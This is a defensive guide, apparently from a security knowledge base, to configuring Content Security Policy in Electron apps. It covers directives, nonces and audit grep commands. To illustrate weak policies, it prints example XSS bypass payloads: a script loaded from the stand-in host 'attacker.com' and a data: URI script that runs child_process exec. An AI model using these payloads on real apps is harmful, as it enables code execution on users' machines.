---
title: CSP Configuration
description: Content Security Policy for Electron apps — directives, bypass prevention, and implementation
---

# Content Security Policy for Electron

CSP is a second line of defense against XSS. It doesn't prevent XSS from existing — but a correctly configured CSP prevents the XSS payload from executing. The attacker injects `<script>alert(1)</script>`, the browser refuses to run it, the attack fails.

In Electron specifically, CSP matters because XSS in a renderer is a serious escalation opportunity. Without CSP, any injected script can immediately call the contextBridge API. With CSP, that path is blocked — the injected script never runs. CSP buys time and reduces the blast radius of an XSS finding that slips through.

The bad news: most Electron apps ship with no CSP at all, and the ones that do often have `unsafe-inline` that neutralizes it.

---

## Strict CSP for Electron

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self' https://api.myapp.com;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
">
```

**What each directive does:**

| Directive | Value | Effect |
|-----------|-------|--------|
| `default-src 'self'` | `'self'` | All resources must be same-origin |
| `script-src 'self'` | `'self'` | Only scripts from same origin — blocks inline XSS |
| `object-src 'none'` | `'none'` | No plugins |
| `base-uri 'self'` | `'self'` | Prevents base-tag injection attacks |
| `frame-ancestors 'none'` | `'none'` | Can't be framed by other content |

The most important directive is `script-src 'self'` without `'unsafe-inline'`. That's the directive that blocks inline XSS payloads. Everything else is useful but secondary.

---

## Implementing via Session WebRequest

For apps that can't easily control HTML headers (rendering from a backend, or the HTML is generated dynamically), apply CSP via Electron's webRequest API:

```javascript
// main.js
const { session } = require('electron');

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline'; " +  // Allow inline styles if needed
        "img-src 'self' data: https:; " +
        "connect-src 'self' https://api.myapp.com wss://api.myapp.com; " +
        "font-src 'self'; " +
        "object-src 'none'; " +
        "base-uri 'self';"
      ]
    }
  });
});
```

This approach applies the CSP to every page response, regardless of whether the HTML contains a meta tag.

---

## Common Bypasses to Avoid

### unsafe-inline

```
script-src 'unsafe-inline'  ← Never use this
```

This allows any `<script>` tag and any inline event handler (`onerror`, `onclick`, `onload`, etc.) to execute. It completely neutralizes CSP as an XSS defense. The entire point of `script-src` is to block inline scripts; `unsafe-inline` opts back in to exactly what CSP is trying to prevent.

### unsafe-eval

```
script-src 'unsafe-eval'  ← Avoid unless absolutely necessary
```

Allows `eval()`, `new Function()`, and `setTimeout('string')`. Often required by older frameworks but significantly weakens CSP. If you need it, audit why, and consider whether the framework can be configured to avoid it.

### Wildcards

```
script-src *  ← Same as no CSP for scripts
connect-src * ← Allows any network destination
```

A wildcard in `script-src` means any external script is allowed. The XSS just loads from an external CDN:

```javascript
<script src="https://attacker.com/payload.js"></script>
```

### data: URIs in script-src

```
script-src 'self' data:  ← Allows data: script bypass
```

```javascript
<script src="data:text/javascript,require('child_process').exec('calc.exe')"></script>
```

---

## CSP for React/Bundled Apps

Bundled Electron apps that need inline scripts (React's hydration, etc.) should use nonces:

```javascript
// Generate a random nonce per page load:
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

// Use in CSP:
`script-src 'self' 'nonce-${nonce}';`

// And in HTML:
`<script nonce="${nonce}">/* inline script */</script>`
```

Or use hashes for specific known inline scripts:

```javascript
// Hash a known inline script:
const hash = crypto.createHash('sha256')
  .update(inlineScript)
  .digest('base64');
`script-src 'self' 'sha256-${hash}'`
```

Both approaches allow specific inline scripts while blocking attacker-injected ones.

---

## Reporting-Only Mode (Development)

Test CSP without breaking production:

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violation
```

This logs violations without blocking — useful for understanding what the current CSP would break before enforcing it. Switch to `Content-Security-Policy` once you've resolved the violations.

---

## CSP as a Bug Bounty Finding

A missing or permissive CSP is a valid bug bounty finding, especially when combined with an XSS vector or when the app lacks other defenses. Frame it as:

- Missing CSP → XSS has no execution barrier → any injected script runs
- `unsafe-inline` CSP → same effect as no CSP for inline XSS
- Wildcard CSP → allows external script load → same effect as no CSP

The severity depends on what else is in scope. If the app also has contextBridge-exposed dangerous functions and no CSP: that's a complete XSS-to-escalation chain with no barriers.

```bash
# Find CSP configuration in app:
grep -r "Content-Security-Policy\|defaultSrc\|scriptSrc" \
  --include="*.js" --include="*.html" . | grep -v node_modules

# Check for unsafe directives:
grep -r "unsafe-inline\|unsafe-eval\|\*\b" \
  --include="*.html" --include="*.js" . | grep -i "csp\|policy" | grep -v node_modules

# Check if webRequest sets CSP:
grep -r "onHeadersReceived\|Content-Security" --include="*.js" . | grep -v node_modules
```
